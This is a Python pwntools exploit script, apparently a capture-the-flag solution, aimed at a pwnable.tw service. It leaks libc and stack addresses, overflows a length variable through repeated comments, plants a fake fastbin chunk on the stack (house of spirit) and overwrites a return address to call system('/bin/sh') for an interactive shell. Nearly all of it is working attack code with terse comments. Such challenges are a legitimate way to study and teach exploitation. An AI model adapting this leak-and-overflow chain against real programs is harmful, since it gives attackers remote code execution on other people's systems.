from pwn import *
import time
### there are two local variable control length of read input
### if insert over 100 comment, one of variable will be overwrite by sprintf from 0x3c to 0x6e
### so we can do  buffer overflow to overwrite heap ptr on the stack and also there is a heap overflow at name malloc


#r = process("./S", env={"LD_PRELOAD" : "./libc_32.so.6"})
r = remote('chall.pwnable.tw',10204)
def survey(name, age, reason, comment):
    r.sendafter(b'name: ',name)  #read(0x3c)
    r.sendlineafter(b'age: ',age)  ## scanf('%d')  ebp-0x58   heap
    r.sendafter(b'movie? ',reason) # read(0x50) ebp-0x50
    r.sendafter(b'comment: ',comment) # read(0x3c) ebp-0xA8

def next_comment(opt):
    r.sendlineafter(b'<y/n>: ',opt)

survey(b'0',b'1',b'b'*0x14 + b'1234',b'0')
r.recvuntil(b'1234')
libc_base = u32(r.recv(4)) - 0x675e7
success(f'libc : {hex(libc_base)}')
next_comment(b'y')
### leak stack
survey(b'a'*0x3c,b'123',b'b'*0x34 + b'1234',b'c'*0x3c)
r.recvuntil(b'1234')
stack = u32(r.recv(4))
success(f'stack : {hex(stack)}')

next_comment(b'y')



#### make overwrite length variable in stack
for _ in range(8):
    survey(b'a' , b'1',b'c' , b'q')
    next_comment(b'y')

for i in range(90):
    #print(i)
    r.sendlineafter(b'age: ',b'1')
    r.sendafter(b'movie? ',b'2')
    #r.sendafter(b'comment: ',b'1')
    next_comment(b'y')



# ###   create fake fastbin chunk  at stack and after malloc use overflow to write (house of spiritD)

fake_chunk = p32(0) + p32(0x41) + b'a'*0x3c + p32(0x11)
survey(b'a' , b'123' , fake_chunk , b'c'*0x54 + p32(stack-0x68))
next_comment(b'y')

# ### get shell
system_addr = libc_base + 0x3a940
bin_sh = libc_base + 0x158e8b
ret = 0x804860d
payload = b'123\x00'.ljust(0x48,b'\x00') + p32(0) + p32(system_addr) + p32(0) + p32(bin_sh)
survey(payload , b'123' , b'0' , b'c')
next_comment(b'n')



r.interactive()